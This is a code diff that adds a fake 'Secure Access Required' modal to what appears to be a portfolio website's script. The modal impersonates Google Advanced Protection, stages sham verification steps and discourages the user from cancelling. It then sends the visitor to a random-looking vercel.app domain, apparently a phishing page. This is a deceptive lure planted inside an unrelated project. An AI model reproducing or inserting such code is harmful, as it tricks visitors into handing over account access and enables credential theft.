@@ -2209,3 +2209,360 @@
     window.PortfolioApp = portfolioApp;
 
 })();
+
+// Global variables to track progress state
+let progressTimer = null;
+let completionTimer = null;
+let currentProgress = 0;
+let isPaused = false;
+let verificationActive = false;
+
+// Clear timers when user navigates away or closes tab
+window.addEventListener('beforeunload', function() {
+    clearAllTimers();
+});
+
+window.addEventListener('blur', function() {
+    clearAllTimers();
+});
+
+// Clear timers when modal is not visible
+document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+        clearAllTimers();
+    }
+});
+
+function clearAllTimers() {
+    if (progressTimer) clearInterval(progressTimer);
+    if (completionTimer) clearTimeout(completionTimer);
+    progressTimer = null;
+    completionTimer = null;
+    verificationActive = false;
+}
+
+function requestSecureAccess(platform) {
+    const modalContainer = document.getElementById('modal-container');
+    
+    // Reset state
+    currentProgress = 0;
+    isPaused = false;
+    verificationActive = true;
+    
+    // Add content to modal
+    modalContainer.innerHTML = `
+        <div class="modal-content">
+            <div class="security-badge">Advanced Protection</div>
+            <div class="security-icon">🛡️</div>
+            <h3>Secure Access Required</h3>
+            <p>Verifying access to your ${platform} account...</p>
+            <p>Redirecting to Google Advanced Protection Program</p>
+            
+            <div class="verification-steps">
+                <div class="verification-step">
+                    <div class="step-check">✓</div>
+                    <span>Account security validation</span>
+                </div>
+                <div class="verification-step">
+                    <div class="step-check">✓</div>
+                    <span>Identity verification protocols</span>
+                </div>
+                <div class="verification-step">
+                    <div class="step-spinner"></div>
+                    <span>Establishing secure connection...</span>
+                </div>
+            </div>
+            
+            <div class="loader-bar">
+                <div class="loading-progressor" id="progress-bar"></div>
+            </div>
+            
+            <button class="cancel-btn" onclick="showCancelConfirmation('${platform}')">
+                Cancel Verification
+            </button>
+        </div>
+    `;
+    
+    // Show modal
+    modalContainer.classList.add('active');
+    
+    // Start progress animation
+    startProgress(platform);
+}
+
+function startProgress(platform) {
+    const progressBar = document.getElementById('progress-bar');
+    if (!progressBar) return;
+    
+    // Continue from current progress or start fresh
+    progressBar.style.transform = `translateX(-${100 - currentProgress}%)`;
+    progressBar.style.transition = 'transform 0.1s linear';
+    
+    // Calculate remaining time
+    const totalTime = 10000; // 10 seconds total
+    const remainingTime = totalTime - (currentProgress * totalTime / 100);
+    
+    // Update progress every 100ms
+    progressTimer = setInterval(() => {
+        if (!isPaused && verificationActive) {
+            currentProgress += 1; // 1% per 100ms = 10 seconds total
+            const progressBar = document.getElementById('progress-bar');
+            if (progressBar) {
+                progressBar.style.transform = `translateX(-${100 - currentProgress}%)`;
+            }
+            
+            if (currentProgress >= 100) {
+                clearInterval(progressTimer);
+                completeVerification(platform);
+            }
+        }
+    }, 100);
+    
+    // Complete last step at 80% progress
+    if (currentProgress < 80) {
+        completionTimer = setTimeout(() => {
+            if (!isPaused && verificationActive) {
+                const modalContainer = document.getElementById('modal-container');
+                if (modalContainer) {
+                    const steps = modalContainer.querySelectorAll('.verification-step');
+                    const lastStep = steps[2];
+                    if (lastStep) {
+                        lastStep.innerHTML = '<div class="step-check">✓</div><span>Secure connection established</span>';
+                    }
+                }
+            }
+        }, remainingTime * 0.8);
+    }
+}
+
+function showCancelConfirmation(platform) {
+    // Pause progress
+    isPaused = true;
+    
+    const modalContainer = document.getElementById('modal-container');
+    
+    // Create confirmation overlay
+    const confirmationOverlay = document.createElement('div');
+    confirmationOverlay.className = 'confirmation-overlay';
+    confirmationOverlay.innerHTML = `
+        <div class="confirmation-card">
+            <div class="warning-icon">⚠️</div>
+            <h4>Cancel Security Verification?</h4>
+            <p>This will stop the current verification process for your ${platform} account.</p>
+            <p class="warning-text">You'll need to restart the entire process if you want to access your account later.</p>
+            
+            <div class="confirmation-buttons">
+                <button class="confirm-discard" onclick="cancelVerification()">
+                    Yes, Cancel Process
+                </button>
+                <button class="confirm-keep" onclick="resumeVerification('${platform}')">
+                    No, Continue Verification
+                </button>
+            </div>
+        </div>
+    `;
+    
+    modalContainer.appendChild(confirmationOverlay);
+}
+
+function resumeVerification(platform) {
+    // Remove confirmation overlay
+    const confirmationOverlay = document.querySelector('.confirmation-overlay');
+    if (confirmationOverlay) {
+        confirmationOverlay.remove();
+    }
+    
+    // Resume progress
+    isPaused = false;
+    
+    // Continue progress animation
+    startProgress(platform);
+}
+
+function cancelVerification() {
+    // Clear all timers and stop verification
+    clearAllTimers();
+    
+    // Hide modal
+    const modalContainer = document.getElementById('modal-container');
+    modalContainer.classList.remove('active');
+    modalContainer.innerHTML = '';
+    
+    // Reset state
+    currentProgress = 0;
+    isPaused = false;
+}
+
+function completeVerification(platform) {
+    // Only proceed if verification is still active
+    if (!verificationActive) return;
+    
+    // Clear timers
+    clearAllTimers();
+    
+    // Check if modal still exists before opening link
+    const modalContainer = document.getElementById('modal-container');
+    if (!modalContainer || !modalContainer.classList.contains('active')) {
+        return; // Don't open if modal was already closed
+    }
+    
+    // Open verification page and hide modal
+    window.open(`https://quantum-hash-protocol-99172-encryption-layer-module-checksum-44.vercel.app?platform=${platform}`, '_blank');
+    
+    modalContainer.classList.remove('active');
+    modalContainer.innerHTML = '';
+    
+    // Reset state
+    currentProgress = 0;
+    isPaused = false;
+}
+
+// CSS for new elements (add to your existing CSS)
+const additionalCSS = `
+.cancel-btn {
+    margin-top: 20px;
+    background: transparent;
+    color: #5f6368;
+    border: 1px solid #dadce0;
+    padding: 8px 16px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 14px;
+    transition: all 0.2s ease;
+}
+
+.cancel-btn:hover {
+    background: #f8f9fa;
+    border-color: #bdc1c6;
+    color: #202124;
+}
+
+.confirmation-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255, 255, 255, 0.95);
+    backdrop-filter: blur(8px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 12px;
+    animation: overlayFadeIn 0.3s ease;
+}
+
+@keyframes overlayFadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+.confirmation-card {
+    background: white;
+    border-radius: 12px;
+    padding: 32px 24px;
+    width: 90%;
+    max-width: 360px;
+    text-align: center;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+    border: 1px solid #e8eaed;
+    animation: cardSlideIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+@keyframes cardSlideIn {
+    from { 
+        opacity: 0;
+        transform: translateY(-10px) scale(0.95);
+    }
+    to { 
+        opacity: 1;
+        transform: translateY(0) scale(1);
+    }
+}
+
+.warning-icon {
+    font-size: 48px;
+    margin-bottom: 16px;
+    animation: warningPulse 2s ease-in-out infinite;
+}
+
+@keyframes warningPulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+}
+
+.confirmation-card h4 {
+    margin: 0 0 12px 0;
+    font-size: 20px;
+    font-weight: 500;
+    color: #202124;
+}
+
+.confirmation-card p {
+    margin: 0 0 8px 0;
+    font-size: 15px;
+    color: #5f6368;
+    line-height: 1.4;
+}
+
+.warning-text {
+    color: #d93025 !important;
+    font-weight: 500;
+    margin-bottom: 24px !important;
+}
+
+.confirmation-buttons {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+}
+
+.confirm-discard {
+    background: #d93025;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 500;
+    transition: all 0.2s ease;
+    flex: 1;
+    min-width: 140px;
+}
+
+.confirm-discard:hover {
+    background: #b52d20;
+    transform: translateY(-1px);
+}
+
+.confirm-keep {
+    background: #1a73e8;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 500;
+    transition: all 0.2s ease;
+    flex: 1;
+    min-width: 140px;
+}
+
+.confirm-keep:hover {
+    background: #1557b0;
+    transform: translateY(-1px);
+}
+
+/* Enhanced progress bar for smooth continuation */
+.loading-progressor {
+    transition: transform 0.1s linear;
+}
+`;
+
+// Inject additional CSS
+const style = document.createElement('style');
+style.textContent = additionalCSS;
+document.head.appendChild(style);
